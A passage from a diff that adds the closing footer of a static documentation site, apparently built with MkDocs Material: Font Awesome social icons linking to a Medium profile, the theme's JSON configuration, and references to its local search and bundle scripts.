+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://medium.com/@vasanthavanan" target="_blank" rel="noopener" title="Vasanth Vanan on Medium" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M180.5 74.262C80.813 74.262 0 155.633 0 256s80.819 181.738 180.5 181.738S361 356.373 361 256 280.191 74.262 180.5 74.262Zm288.25 10.646c-49.845 0-90.245 76.619-90.245 171.095s40.406 171.1 90.251 171.1 90.251-76.619 90.251-171.1H559c0-94.503-40.4-171.095-90.248-171.095Zm139.506 17.821c-17.526 0-31.735 68.628-31.735 153.274s14.2 153.274 31.735 153.274S640 340.631 640 256c0-84.649-14.215-153.271-31.742-153.271Z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.footer", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.2a6f1dda.min.js"></script>
+      
+    
+  </body>
+</html>
